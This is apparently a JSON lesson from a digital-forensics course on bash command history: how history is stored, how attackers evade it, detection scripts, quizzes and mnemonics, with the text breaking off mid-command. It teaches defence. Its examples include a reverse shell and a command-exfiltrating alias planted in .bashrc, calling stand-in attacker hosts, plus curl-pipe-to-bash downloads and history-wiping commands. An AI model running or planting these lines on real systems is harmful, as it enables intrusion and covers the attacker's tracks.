{
  "lesson_id": "cc1f34d8-2171-422a-b2c5-95654d209db0",
  "domain": "dfir",
  "title": "Linux Shells and Command History Forensics",
  "difficulty": 2,
  "order_index": 75,
  "prerequisites": [
    "d4e5f6a7-b8c9-4d0e-1f2a-3b4c5d6e7f8a"
  ],
  "concepts": [
    "Bash history files and configuration",
    "Command history forensics and analysis",
    "History file tampering detection",
    "Shell configuration files (.bashrc, .profile)",
    "Command timestamps and session reconstruction",
    "History evasion techniques",
    "Alternative shells (zsh, fish, tcsh)",
    "Real-time command logging",
    "Rootkit detection via command history"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Master forensic analysis of bash history files across all user accounts",
    "Reconstruct attacker activity timelines from command history",
    "Detect history file tampering and evasion techniques",
    "Analyze shell configuration files for persistence mechanisms",
    "Understand limitations of history files and alternative logging methods",
    "Identify anti-forensic techniques used by sophisticated attackers"
  ],
  "post_assessment": [
    {
      "question": "What environment variable controls how many commands are stored in bash history?",
      "options": [
        "HISTSIZE",
        "HISTFILESIZE",
        "HISTFILE",
        "HISTCONTROL"
      ],
      "correct_answer": 0,
      "explanation": "HISTSIZE controls the number of commands stored in memory during the session, while HISTFILESIZE controls how many are saved to the .bash_history file. Both work together to determine history retention.",
      "question_id": "d659215b-3172-4b9f-94e9-595283a9648b",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "Which HISTCONTROL setting prevents commands starting with a space from being logged?",
      "options": [
        "erasedups",
        "ignorespace",
        "ignoreboth",
        "ignoredups"
      ],
      "correct_answer": 1,
      "explanation": "HISTCONTROL=ignorespace causes bash to ignore commands that start with a space. Attackers exploit this by prefixing malicious commands with spaces. 'ignoreboth' combines 'ignorespace' and 'ignoredups'.",
      "question_id": "bdb9fa10-33c4-4888-bd49-d2b402d4e6b2",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "What is the forensic significance of finding 'unset HISTFILE' in a user's .bashrc?",
      "options": [
        "Normal configuration",
        "Performance optimization",
        "Anti-forensic technique to prevent history logging",
        "Error in configuration"
      ],
      "correct_answer": 2,
      "explanation": "'unset HISTFILE' completely disables history logging by removing the variable that points to the history file. This is a strong indicator of anti-forensic intent, often added by attackers.",
      "question_id": "e66fe268-cd8d-410d-b332-238cf437e935",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "When does bash write commands to .bash_history?",
      "options": [
        "Immediately after each command",
        "Every 5 minutes",
        "Only when the shell exits normally",
        "When HISTSIZE is reached"
      ],
      "correct_answer": 2,
      "explanation": "By default, bash only writes history to .bash_history when the shell exits normally (logout, exit command). If a session is killed or crashes, the history is lost unless 'shopt -s histappend' is configured.",
      "question_id": "3eabb0be-89a4-4abf-86b7-ff861e861355",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "What does finding 'PROMPT_COMMAND=\"history -c\"' in .bashrc indicate?",
      "options": [
        "Automatic history backup",
        "History compression",
        "History cleared after every command (anti-forensic)",
        "History synced to server"
      ],
      "correct_answer": 2,
      "explanation": "PROMPT_COMMAND executes after every command. 'history -c' clears all history. Combined, this creates an environment where no command history is retained - a clear anti-forensic measure.",
      "question_id": "befa4066-9f4b-4861-a510-c32f06a62673",
      "type": "multiple_choice",
      "difficulty": 2
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "minimum_effective_dose",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "## Welcome to Command History Forensics! 🕵️\n\n**Imagine this**: You're investigating a breach. You've found suspicious accounts (Lesson 74). You've identified unusual file permissions (Lesson 73). Now comes the moment of truth:\n\n**What did the attacker actually DO on this system?**\n\nCommand history files are like the **security camera footage** of Linux systems. Every command typed by every user - potentially recorded and waiting for you to analyze.\n\n**Why this is one of the most powerful forensic artifacts**:\n\n- Shows **attacker behavior** (reconnaissance, exploitation, data exfiltration)\n- Reveals **tools and techniques** (wget malware.sh, nc -e /bin/bash)\n- Provides **timeline** of activity (when combined with timestamps)\n- Exposes **mistakes** attackers make (typos, testing, comments)\n- Identifies **persistence mechanisms** (cron jobs, startup scripts)\n\n**Real case example**: In a 2020 healthcare breach, the attacker's bash history showed:\n```bash\nwhoami\nid\nsudo su -\nfind / -name \"*.db\" 2>/dev/null\ntar czf patient_data.tar.gz /var/db/patients/\npython3 -m http.server 8000\n# Patient database exfiltrated to 45.123.67.89\n```\n\nEvery step of the attack - **documented by the attacker themselves**!\n\n**But here's the challenge**: Sophisticated attackers know about history files. They:\n- Disable history logging\n- Clear history after their activities\n- Use anti-forensic techniques\n- Manipulate timestamps\n\n**Your job**: Learn both **what to look for** AND **what to look for when attackers try to hide**.\n\n**Jim Kwik principle - Minimum Effective Dose**: I'll teach you the 20% of history forensics techniques that solve 80% of real cases. Master these, and you'll reconstruct most attacks successfully.\n\nLet's uncover what attackers tried to hide! 🔍🎯"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Understanding Linux Command History Architecture\n\n## The Bash History System\n\n**Bash** (Bourne Again Shell) is the default shell on most Linux systems. It maintains command history through several components:\n\n### 1. History Storage Locations\n\n**In-Memory History**:\n- Current shell session commands stored in RAM\n- Managed by `HISTSIZE` variable\n- Accessible via `history` command\n- Lost if session crashes or is killed\n\n**On-Disk History**:\n- Written to `~/.bash_history` (default location)\n- Managed by `HISTFILESIZE` variable\n- Persists between sessions\n- Written when shell exits normally\n\n```\n┌─────────────────────────────────────────┐\n│         User Session (RAM)              │\n│  ┌───────────────────────────────────┐ │\n│  │   In-Memory History Buffer        │ │\n│  │   (HISTSIZE = 1000 commands)      │ │\n│  │                                   │ │\n│  │   $ ls -la                        │ │\n│  │   $ cd /tmp                       │ │\n│  │   $ whoami                        │ │\n│  └───────────────────────────────────┘ │\n│                  ↓                      │\n│         (on shell exit)                 │\n└─────────────────────────────────────────┘\n↓\n┌─────────────────────────────────────────┐\n│       ~/.bash_history (Disk)            │\n│  (HISTFILESIZE = 2000 lines)            │\n│                                         │\n│  Previous commands from past sessions   │\n│  + new commands from this session       │\n└─────────────────────────────────────────┘\n```\n\n**Critical Forensic Point**: If a session is killed (kill -9, system crash, power loss), in-memory history is **never written** to .bash_history!\n\n### 2. Key Environment Variables\n\n**HISTFILE**:\n- Location of history file\n- Default: `~/.bash_history`\n- Can be changed: `export HISTFILE=~/.hidden_history`\n- **If unset**: No history is saved to disk!\n\n```bash\n# Check current setting\necho $HISTFILE\n# Output: /home/user/.bash_history\n\n# Anti-forensic technique (disable history)\nunset HISTFILE\n# Now NO commands will be saved to disk\n```\n\n**HISTSIZE**:\n- Number of commands in memory (current session)\n- Default: 500-1000 (varies by distribution)\n- Set to 0 to disable: `export HISTSIZE=0`\n\n```bash\n# Check current setting\necho $HISTSIZE\n# Output: 1000\n\n# Increase for better forensics\nexport HISTSIZE=10000\n```\n\n**HISTFILESIZE**:\n- Maximum lines in ~/.bash_history file\n- Default: 500-2000 (varies by distribution)\n- Old commands deleted when limit reached\n\n```bash\n# Check current setting\necho $HISTFILESIZE\n# Output: 2000\n\n# Increase retention\nexport HISTFILESIZE=100000\n```\n\n**HISTCONTROL**:\n- Controls what commands are saved\n- **Critical for anti-forensics**\n\nValues:\n- `ignorespace` - Ignore commands starting with space\n- `ignoredups` - Ignore duplicate consecutive commands\n- `ignoreboth` - Both of the above\n- `erasedups` - Remove all previous duplicates\n\n```bash\n# Check current setting\necho $HISTCONTROL\n# Output: ignoreboth\n\n# Anti-forensic exploitation:\nexport HISTCONTROL=ignorespace\ncurl http://malicious.com/malware.sh | bash\n# ↑ Note leading space - command NOT logged!\n```\n\n**HISTTIMEFORMAT**:\n- Adds timestamps to history\n- **Not enabled by default!**\n- When enabled: Shows when commands were executed\n\n```bash\n# Enable timestamps\nexport HISTTIMEFORMAT=\"%F %T \"\n\n# Now history shows:\n# 1234  2023-10-15 14:23:17 whoami\n# 1235  2023-10-15 14:23:22 id\n```\n\n**Forensic gold mine when enabled, but rare!**\n\n### 3. Shell Configuration Files\n\nThese files control history behavior and may contain persistence mechanisms:\n\n**System-wide** (affect all users):\n- `/etc/profile` - Executed for login shells\n- `/etc/bash.bashrc` (Debian/Ubuntu) or `/etc/bashrc` (RHEL/CentOS)\n\n**Per-user** (in user's home directory):\n- `~/.bash_profile` - Login shells (SSH, console login)\n- `~/.bashrc` - Non-login interactive shells\n- `~/.profile` - Used if .bash_profile doesn't exist\n- `~/.bash_logout` - Executed when shell exits\n- `~/.bash_aliases` - Alias definitions\n\n**Loading order for login shells**:\n```\n1. /etc/profile\n2. ~/.bash_profile (if exists)\nOR ~/.bash_login (if .bash_profile doesn't exist)\nOR ~/.profile (if neither above exist)\n3. ~/.bashrc (usually sourced from .bash_profile)\n```\n\n**Forensic importance**:\n- Attackers modify these to:\n- Disable history logging\n- Set HISTFILESIZE=0\n- Add malicious aliases\n- Establish persistence (run backdoors at login)\n\n**Example - Attacker-modified ~/.bashrc**:\n```bash\n# Normal content\nexport PATH=/usr/local/bin:/usr/bin:/bin\n\n# Malicious additions (attacker inserted):\nexport HISTFILE=/dev/null  # History goes to black hole\nexport HISTSIZE=0  # Don't store history in memory\nalias sudo=\"bash -c 'curl http://exfil.com?cmd=$BASH_COMMAND' && sudo\"  # Exfiltrate all sudo commands\n\n# Backdoor persistence\n(nc -e /bin/bash attacker.com 4444 &) 2>/dev/null  # Reverse shell on login\n```bash\n\n### 4. History Appending vs Overwriting\n\n**Default behavior (histappend OFF)**:\n- Last closed shell **overwrites** .bash_history\n- Multiple concurrent shells = history from only one survives\n\n**With histappend ON**:\n- Each shell **appends** to .bash_history\n- Multiple concurrent shells = all history preserved\n\n```bash\n# Check status\nshopt histappend\n# Output: histappend on (or off)\n\n# Enable appending\nshopt -s histappend\n\n# Add to ~/.bashrc to make permanent\necho 'shopt -s histappend' >> ~/.bashrc\n```\n\n**Forensic scenario**:\n```\nAttacker scenario 1 (histappend OFF):\n- Attacker SSH session 1 (runs malicious commands)\n- Victim SSH session 2 (normal admin work)\n- Session 2 closes last → overwrites history with benign commands\n- Attacker's commands: LOST\n\nAttacker scenario 2 (histappend ON):\n- Both sessions append to history\n- All commands preserved\n- Attacker's commands: RECOVERABLE\n```\n\n**Recommendation**: Always enable histappend for better forensics.\n\n## History Commands and Their Forensic Uses\n\n**View history**:\n```bash\nhistory           # Show all in-memory history with line numbers\nhistory 10        # Show last 10 commands\nhistory | grep ssh  # Search history for 'ssh'\n```\n\n**Execute from history**:\n```bash\n!123              # Execute command number 123\n!!                # Execute previous command\n!-2               # Execute command 2 lines ago\n!ssh              # Execute most recent command starting with 'ssh'\n```\n\n**Modify history**:\n```bash\nhistory -c        # Clear in-memory history (anti-forensic!)\nhistory -w        # Write in-memory history to HISTFILE now\nhistory -a        # Append new commands to HISTFILE\nhistory -d 123    # Delete command number 123\n```\n\n**Anti-forensic commands you'll see attackers use**:\n```bash\nhistory -c && rm ~/.bash_history  # Nuclear option - destroy all history\nhistory -d 1234   # Delete single incriminating command\nhistory -d $(history | tail -1 | awk '{print $1}')  # Delete this command itself\n```bash\n\n## Alternative Shells and Their History Files\n\nNot all systems use bash. Different shells = different history files:\n\n```\n┌─────────────┬─────────────────────┬──────────────────┐\n│ Shell       │ History File        │ Notes            │\n├─────────────┼─────────────────────┼──────────────────┤\n│ bash        │ ~/.bash_history     │ Most common      │\n├─────────────┼─────────────────────┼──────────────────┤\n│ zsh         │ ~/.zsh_history      │ Growing in       │\n│             │ ~/.zhistory         │ popularity       │\n├─────────────┼─────────────────────┼──────────────────┤\n│ fish        │ ~/.local/share/     │ Modern shell     │\n│             │ fish/fish_history   │                  │\n├─────────────┼─────────────────────┼──────────────────┤\n│ tcsh/csh    │ ~/.history          │ Less common      │\n├─────────────┼─────────────────────┼──────────────────┤\n│ ksh         │ ~/.sh_history       │ Legacy systems   │\n├─────────────┼─────────────────────┼──────────────────┤\n│ sh (dash)   │ No history          │ Minimal shell    │\n└─────────────┴─────────────────────┴──────────────────┘\n```\n\n**Forensic tip**: Always check:\n```bash\n# What shells are available?\ncat /etc/shells\n\n# What shell does each user use?\nawk -F: '{print $1, $7}' /etc/passwd\n\n# Check all possible history files\nfind /home -name \".*history\" 2>/dev/null\nfind /root -name \".*history\" 2>/dev/null\n```bash\n\n## Forensic Timeline Challenges\n\n**Problem**: .bash_history has **NO timestamps by default**!\n\nYou see:\n```\nls -la\ncd /tmp\nwget http://malicious.com/shell.sh\nbash shell.sh\n```\n\nBut you **don't know**:\n- When were these executed?\n- In what order (file could be modified)?\n- By which session?\n\n**Solution 1: HISTTIMEFORMAT** (if enabled)\n```bash\nexport HISTTIMEFORMAT=\"%F %T \"\nhistory\n# Output:\n# 1234  2023-10-15 14:23:17 wget http://malicious.com/shell.sh\n```\n\n**Solution 2: Correlation with other artifacts**\n- File system timestamps (when was shell.sh created?)\n- Auth logs (when did user log in?)\n- Process accounting (if enabled)\n- Network logs (when was malicious.com contacted?)\n\n**Solution 3: File modification time**\n```bash\nstat ~/.bash_history\n# Modification time = last time file was written\n# (usually when last shell exited)\n```\n\n**Forensic reality**: Perfect timelines are rare. You'll piece together evidence from multiple sources."
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On: Command History Forensics Lab\n\n## Exercise 1: Basic History Enumeration\n\n**Scenario**: You're investigating all user accounts on a compromised system.\n\n**Step 1: Find all history files**\n```bash\n# Find bash history files\nsudo find /home -name \".bash_history\" 2>/dev/null\nsudo find /root -name \".bash_history\" 2>/dev/null\n\n# Find ALL shell history files (any shell)\nsudo find / -type f -name \".*history\" 2>/dev/null\n\n# Count commands per user\nfor user_home in /home/* /root; do\nhistory_file=\"$user_home/.bash_history\"\nif [ -f \"$history_file\" ]; then\ncount=$(wc -l < \"$history_file\")\necho \"$(basename $user_home): $count commands\"\nfi\ndone\n```\n\n**Step 2: Check file metadata**\n```bash\n# When was history last modified?\nsudo stat /home/suspicious_user/.bash_history\n\n# Look for:\n# - Modification time (when last shell exited)\n# - Size (0 bytes = cleared or disabled)\n# - Permissions (should be 600)\n```\n\n**Red flags**:\n- History file is 0 bytes (cleared)\n- History file is missing (deleted)\n- Very few commands (<50) for active account\n- Recent modification time matches intrusion timeframe\n\n---\n\n## Exercise 2: Searching for Malicious Commands\n\n**Common attacker commands to search for**:\n\n```bash\n# Create comprehensive search script\n# !/bin/bash\n# search_malicious_history.sh\n\nHISTORY_FILE=\"$1\"\n\nif [ ! -f \"$HISTORY_FILE\" ]; then\necho \"Usage: $0 /path/to/.bash_history\"\nexit 1\nfi\n\necho \"[*] Analyzing: $HISTORY_FILE\"\necho \"\"\n\n# Network activity\necho \"[+] Network commands:\"\ngrep -E \"wget|curl|nc|netcat|ncat|socat|telnet|ftp\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\n# Download and execute\necho \"[+] Download & execute patterns:\"\ngrep -E \"\\| bash|\\| sh|curl.*\\|.*bash|wget.*\\|.*sh\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\n# Privilege escalation\necho \"[+] Privilege escalation attempts:\"\ngrep -E \"sudo|su -|pkexec|passwd\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\n# User/group manipulation\necho \"[+] User/group modifications:\"\ngrep -E \"useradd|usermod|groupadd|groupmod|adduser\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\n# File manipulation\necho \"[+] Sensitive file access:\"\ngrep -E \"/etc/passwd|/etc/shadow|/etc/sudoers|authorized_keys\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\n# Reconnaissance\necho \"[+] Reconnaissance commands:\"\ngrep -E \"whoami|id|uname|hostname|ifconfig|ip addr|netstat|ss |ps aux|w |who\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\n# Data exfiltration\necho \"[+] Data exfiltration indicators:\"\ngrep -E \"tar.*czf|zip|scp|rsync|base64.*encode|xxd\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\n# History tampering\necho \"[+] History manipulation:\"\ngrep -E \"history -c|history -d|unset.*HIST|rm.*history|HISTFILE|HISTSIZE=0\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\n# Persistence mechanisms\necho \"[+] Persistence mechanisms:\"\ngrep -E \"crontab|systemctl.*enable|rc.local|.bashrc|.profile|authorized_keys|ssh.*key\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\necho \"[*] Analysis complete\"\n```\n\n**Usage**:\n```bash\nsudo ./search_malicious_history.sh /home/attacker/.bash_history\n```\n\n---\n\n## Exercise 3: Detecting History Tampering\n\n**Indicators of tampered history**:\n\n**Check 1: History configuration in shell config files**\n```bash\n# Check for anti-forensic settings\nsudo grep -E \"HIST|history\" /home/user/.bashrc /home/user/.bash_profile /home/user/.profile\n\n# Red flags:\n# - export HISTFILE=/dev/null\n# - export HISTSIZE=0\n# - unset HISTFILE\n# - history -c (in PROMPT_COMMAND)\n```\n\n**Check 2: Compare history size to account activity**\n```bash\n# How long has account existed?\nsudo stat /home/user | grep Birth\n\n# How many commands in history?\nwc -l /home/user/.bash_history\n\n# Analysis:\n# - Account 6 months old with only 20 commands = SUSPICIOUS\n# - Active admin account with no history = SUSPICIOUS\n```\n\n**Check 3: Look for history clearing commands**\n```bash\n# Ironically, history clearing attempts sometimes logged\nsudo grep -E \"history -c|history -d|> .bash_history|rm.*history\" /home/user/.bash_history\n```\n\n**Check 4: File metadata anomalies**\n```bash\n# History file timestamp AFTER last login?\n# (Indicates manual modification)\nLAST_LOGIN=$(sudo lastlog -u username | tail -1 | awk '{print $4, $5, $6, $9}')\nHIST_MTIME=$(stat -c '%y' /home/username/.bash_history)\necho \"Last login: $LAST_LOGIN\"\necho \"History modified: $HIST_MTIME\"\n# If history modified AFTER last login → manually tampered\n```\n\n---\n\n## Exercise 4: Timeline Reconstruction\n\n**Scenario**: Reconstruct attack timeline from history (no timestamps available)\n\n**Technique: Cross-reference with file system artifacts**\n\n```bash\n# !/bin/bash\n# timeline_reconstruction.sh\n\nUSER=\"attacker\"\nHOME=\"/home/$USER\"\nHISTORY=\"$HOME/.bash_history\"\n\necho \"[*] Timeline Reconstruction for $USER\"\necho \"\"\n\n# Step 1: When did user last login?\necho \"[+] Last login:\"\nsudo lastlog -u $USER\necho \"\"\n\n# Step 2: When was history file last modified?\necho \"[+] History file last modified:\"\nstat -c '%y' $HISTORY\necho \"\"\n\n# Step 3: Extract commands that created files\necho \"[+] Commands that likely created files:\"\ngrep -E \"wget|curl|touch|echo.*>|cat.*>|cp|mv\" $HISTORY | while read cmd; do\necho \"  Command: $cmd\"\n\n# Try to find created files\nif echo \"$cmd\" | grep -q wget; then\nFILE=$(echo \"$cmd\" | grep -oE \"https?://[^ ]+\" | xargs basename)\nif [ -f \"$HOME/$FILE\" ]; then\necho \"    File: $HOME/$FILE\"\necho \"    Created: $(stat -c '%y' $HOME/$FILE)\"\nfi\nfi\necho \"\"\ndone\n\n# Step 4: Correlate with auth logs\necho \"[+] Login sessions (from auth.log):\"\nsudo grep \"$USER.*session opened\" /var/log/auth.log | tail -10\necho \"\"\n\necho \"[*] Cross-reference history commands with file timestamps to build timeline\"\n```\n\n**Manual analysis**:\n1. List all commands: `cat ~/.bash_history`\n2. For each command, check if it created files\n3. Use file timestamps to order commands chronologically\n4. Build attack timeline\n\n---\n\n## Exercise 5: Analyzing Shell Configuration for Persistence\n\n**Check all shell config files for malicious modifications**:\n\n```bash\n# !/bin/bash\n# audit_shell_configs.sh\n\nUSER=\"$1\"\nHOME=$(eval echo ~$USER)\n\necho \"[*] Auditing shell configuration for $USER\"\necho \"\"\n\nCONFIG_FILES=\"\n$HOME/.bashrc\n$HOME/.bash_profile\n$HOME/.profile\n$HOME/.bash_aliases\n$HOME/.bash_logout\n/etc/profile\n/etc/bash.bashrc\n/etc/bashrc\n\"\n\nfor config in $CONFIG_FILES; do\nif [ -f \"$config\" ]; then\necho \"[+] Checking: $config\"\n\n# Check for history manipulation\nif grep -q \"HISTFILE\" \"$config\"; then\necho \"  [!] HISTFILE setting found:\"\ngrep \"HISTFILE\" \"$config\" | sed 's/^/      /'\nfi\n\nif grep -q \"HISTSIZE\" \"$config\"; then\necho \"  [!] HISTSIZE setting found:\"\ngrep \"HISTSIZE\" \"$config\" | sed 's/^/      /'\nfi\n\nif grep -q \"history -c\" \"$config\"; then\necho \"  [!!] ALERT: History clearing detected:\"\ngrep \"history\" \"$config\" | sed 's/^/      /'\nfi\n\n# Check for suspicious aliases\necho \"  [*] Aliases:\"\ngrep \"^alias\" \"$config\" | sed 's/^/      /'\n\n# Check for network commands (potential backdoors)\nif grep -qE \"nc |ncat |socat |telnet |curl.*\\|.*bash\" \"$config\"; then\necho \"  [!!] ALERT: Network command in config:\"\ngrep -E \"nc |ncat |socat |telnet |curl.*\\|.*bash\" \"$config\" | sed 's/^/      /'\nfi\n\n# Check for cron jobs\nif grep -qE \"crontab|cron\" \"$config\"; then\necho \"  [!] Cron reference found:\"\ngrep -E \"crontab|cron\" \"$config\" | sed 's/^/      /'\nfi\n\necho \"\"\nfi\ndone\n\necho \"[*] Audit complete\"\n```\n\n**Usage**:\n```bash\nsudo ./audit_shell_configs.sh suspicious_user\n```\n\n---\n\n## Exercise 6: Real-World Attack Pattern Recognition\n\n**Practice identifying attack stages from history**:\n\n**Sample .bash_history content**:\n```\nwhoami\nid\nuname -a\ncat /etc/issue\nls -la /home\ncat /etc/passwd\ngrep -E \"1000|0\" /etc/passwd\nps aux | grep root\nfind / -perm -4000 -type f 2>/dev/null\nfind / -writable -type d 2>/dev/null\ncurl https://gist.githubusercontent.com/attacker/linpeas.sh -o /tmp/linpeas.sh\nbash /tmp/linpeas.sh > /tmp/linpeas_output.txt\ncat /tmp/linpeas_output.txt | grep -i \"sudo\"\nsudo su -\n```\n\n**Forensic analysis** (identify attack stages):\n\n1. **Initial Access** (not shown in history - likely via web exploit)\n\n2. **Reconnaissance**:\n```\nwhoami              ← Who am I?\nid                  ← What groups?\nuname -a            ← What OS/kernel?\ncat /etc/issue      ← OS version\nls -la /home        ← Other users?\ncat /etc/passwd     ← All accounts?\ngrep -E \"1000|0\" /etc/passwd  ← Admins and normal users\nps aux | grep root  ← What's running as root?\n```\n\n3. **Privilege Escalation Enumeration**:\n```\nfind / -perm -4000 -type f 2>/dev/null   ← SUID binaries\nfind / -writable -type d 2>/dev/null     ← World-writable directories\n```\n\n4. **Tool Download**:\n```\ncurl https://gist.githubusercontent.com/attacker/linpeas.sh -o /tmp/linpeas.sh\nbash /tmp/linpeas.sh > /tmp/linpeas_output.txt\n```\nLinPEAS = privilege escalation scanner\n\n5. **Exploitation**:\n```\ncat /tmp/linpeas_output.txt | grep -i \"sudo\"\nsudo su -  ← Successfully escalated to root!\n```\n\n**Timeline**: ~15-30 minutes from initial access to root (typical)\n\n**Next steps**: Check root's history for post-exploitation activity\n\n---\n\n## Exercise 7: Recovering Deleted History\n\n**Scenario**: Attacker ran `rm ~/.bash_history` but you suspect commands may be recoverable.\n\n**Technique 1: Check for in-memory history (if session still active)**\n```bash\n# If attacker's session still running:\nsudo ps aux | grep bash\n# Note PID of attacker's bash process\n\n# Dump process memory\nsudo gcore <PID>\n\n# Extract strings\nstrings core.<PID> | grep -E \"(wget|curl|nc|bash)\" > recovered_commands.txt\n```\n\n**Technique 2: File carving from disk**\n```bash\n# Unmount or remount read-only first!\nsudo mount -o remount,ro /home\n\n# Use grep to search raw disk\nsudo grep -a -B 5 -A 5 \"wget.*malicious\" /dev/sda1 > carved_history.txt\n\n# Or use specialized tools\nsudo foremost -i /dev/sda1 -o /forensics/carved/\nsudo strings /dev/sda1 | grep -E \"^[a-z]{2,} \" > possible_commands.txt\n```\n\n**Technique 3: Check for backup copies**\n```bash\n# Some backup solutions copy user files\nfind /var/backups -name \"*history*\" 2>/dev/null\nfind /var/cache -name \"*history*\" 2>/dev/null\n\n# Check for shadow copies (if LVM snapshots exist)\nlvs  # List logical volumes\nsudo mount /dev/vg0/snapshot /mnt/snapshot\ncat /mnt/snapshot/home/user/.bash_history\n```\n\n**Technique 4: Check shell's exit append behavior**\n```bash\n# If histappend was enabled, history might be in rotated logs\n# Some systems backup .bash_history on rotation\nfind /home/user -name \".bash_history*\" 2>/dev/null\nls -la /home/user/.bash_history.*\n```\n\n---\n\n## Exercise 8: Setting Up Better History Logging\n\n**Implement comprehensive history logging for future forensics**:\n\n**Method 1: Enhanced .bashrc (per-user)**\n```bash\n# Add to /etc/skel/.bashrc (for new users) or existing ~/.bashrc\n\n# Enable timestamps\nexport HISTTIMEFORMAT=\"%F %T \"\n\n# Increase retention\nexport HISTSIZE=50000\nexport HISTFILESIZE=50000\n\n# Append don't overwrite\nshopt -s histappend\n\n# Save after each command (not just on exit)\nexport PROMPT_COMMAND=\"history -a; $PROMPT_COMMAND\"\n\n# Don't ignore anything\nunset HISTCONTROL\n\n# Log to separate file per session\nexport HISTFILE=~/.bash_history.$(date +%Y%m%d_%H%M%S)_$$\n```\n\n**Method 2: System-wide logging with auditd**\n```bash\n# Install auditd\nsudo apt install auditd  # Debian/Ubuntu\nsudo yum install audit   # RHEL/CentOS\n\n# Add rule to log all command executions\nsudo auditctl -a always,exit -F arch=b64 -S execve -k commands\n\n# Make persistent\nsudo sh -c 'echo \"-a always,exit -F arch=b64 -S execve -k commands\" >> /etc/audit/rules.d/commands.rules'\n\n# Search audit logs\nsudo ausearch -k commands\nsudo ausearch -k commands -i  # Interpreted format\n```\n\n**Method 3: Real-time logging to syslog**\n```bash\n# Add to /etc/bash.bashrc or ~/.bashrc\nfunction log_command() {\nlogger -p local1.notice -t bash_command \"$(whoami): $(history 1 | sed 's/^[ ]*[0-9]\\+[ ]*//')\"\n}\nexport PROMPT_COMMAND='log_command'\n\n# Commands now logged to /var/log/syslog\n# Survives history clearing!\n```\n\n**Verify it works**:\n```bash\n# Run a test command\necho \"test command logging\"\n\n# Check if logged\nsudo tail /var/log/syslog | grep bash_command\n# Should show: bash_command: username: echo \"test command logging\"\n```\n\n---\n\n## Key Takeaways\n\n✅ **Always check history for ALL users** (including root)\n✅ **Look for anti-forensic indicators** in .bashrc/.bash_profile\n✅ **Cross-reference history with file timestamps** for timeline\n✅ **Search for common attacker patterns** (wget, curl, nc, sudo)\n✅ **Check alternative shells** (zsh, fish, tcsh)\n✅ **Implement better logging** for future incidents\n\nHistory analysis is powerful but has limitations - attackers can evade it. Combine with other forensic artifacts (logs, process accounting, network captures) for complete picture."
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "# Memory Aids: Command History Forensics\n\n## 1. The Five History Variables (Remember: \"FISHY Commands\")\n\n**F**ILE - HISTFILE (where history is saved)\n**I**GNORE - HISTCONTROL (what to ignore)\n**S**IZE - HISTSIZE (in-memory command count)\n**H**UGE file - HISTFILESIZE (on-disk command count)\n**Y**ou saw when - HISTTIMEFORMAT (timestamps)\n\n```\nF → HISTFILE       = /home/user/.bash_history\nI → HISTIGNORE     = ls:cd:pwd (ignored commands)\nS → HISTSIZE       = 1000 (RAM storage)\nH → HISTFILESIZE   = 2000 (disk storage)\nY → HISTTIMEFORMAT = \"%F %T \" (timestamp format)\n```\n\n---\n\n## 2. Anti-Forensic Techniques (Remember: \"UCHD\" - \"You See History Destroyed\")\n\n**U**nset HISTFILE - Disables history completely\n**C**lear history - `history -c` command\n**H**ISTSIZE=0 - No in-memory storage\n**D**elete history - `rm ~/.bash_history`\n\n```\nU → unset HISTFILE               (nuclear option)\nC → history -c                   (clear RAM)\nH → export HISTSIZE=0            (disable RAM logging)\nD → rm ~/.bash_history           (delete file)\n```\n\n**Memory hook**: \"**U**h oh, **C**riminals **H**ide **D**ata\"\n\n---\n\n## 3. HISTCONTROL Values (Remember: \"DIBE\" - \"Dib\")\n\n**D**ups - ignoredups (ignore duplicate consecutive commands)\n**I**gnore space - ignorespace (ignore commands starting with space)\n**B**oth - ignoreboth (both dups and space)\n**E**rase - erasedups (remove ALL previous duplicates)\n\n```\nHISTCONTROL=ignoredups   → Ignore: cmd, cmd (consecutive)\nHISTCONTROL=ignorespace  → Ignore:  cmd (leading space)\nHISTCONTROL=ignoreboth   → Both of the above\nHISTCONTROL=erasedups    → Remove all previous duplicates\n```\n\n**Forensic impact**:\n- `ignorespace` = Attacker's best friend! (`curl malicious.com`)\n- `erasedups` = Loses valuable timeline information\n\n---\n\n## 4. Alternative Shell History Files (Remember: \"BaZing FaTe KiSH\")\n\n**Ba**sh → ~/.bash_history\n**Z**sh → ~/.zsh_history or ~/.zhistory\n**F**ish → ~/.local/share/fish/fish_history\n**T**csh → ~/.history\n**K**sh → ~/.sh_history\n\n**Forensic rule**: **Don't assume bash!** Always check:\n```bash\ncat /etc/shells  # Available shells\nfind /home -name \"*history\" 2>/dev/null  # All history files\n```\n\n---\n\n## 5. Shell Configuration Files (Remember: \"BPRAL\" - \"Be Practical\")\n\n**B**ashrc → ~/.bashrc (interactive non-login shells)\n**P**rofile → ~/.profile (if .bash_profile doesn't exist)\n**R**oot config → ~/.bash_profile (login shells)\n**A**liases → ~/.bash_aliases (alias definitions)\n**L**ogout → ~/.bash_logout (cleanup on exit)\n\n**Load order** (login shell):\n```\n1. /etc/profile           ← System-wide\n2. ~/.bash_profile        ← User login shell\n3.   └→ ~/.bashrc         ← Usually sourced from .bash_profile\n```\n\n**Forensic significance**: Attackers modify these to:\n- Disable history: `export HISTFILE=/dev/null`\n- Add persistence: `(nc -e /bin/bash attacker.com 4444 &) 2>/dev/null`\n- Create aliases: `alias ls='ls ; curl 